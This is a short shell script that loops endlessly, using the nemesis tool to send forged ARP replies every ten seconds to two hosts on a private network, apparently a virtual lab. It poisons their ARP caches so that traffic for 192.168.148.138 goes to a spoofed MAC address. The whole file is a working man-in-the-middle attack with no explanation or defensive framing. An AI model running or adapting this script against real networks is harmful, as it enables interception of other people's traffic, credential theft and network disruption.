#!/bin/sh
while true
do
	nemesis arp -S 192.168.148.138 -D 192.168.148.137 -h 2a:22:23:90:a0:9f -m 00:0c:29:3b:cf:d3 -H 4e:32:24:ce:0a:81 -M 00:0c:29:3b:cf:d3
	nemesis arp -S 192.168.148.138 -D 192.168.148.139 -h 2a:22:23:90:a0:9f -m 4e:32:24:ce:0a:81 -H 00:0c:29:3b:cf:d3 -M 4e:32:24:ce:0a:81	
	sleep 10
done
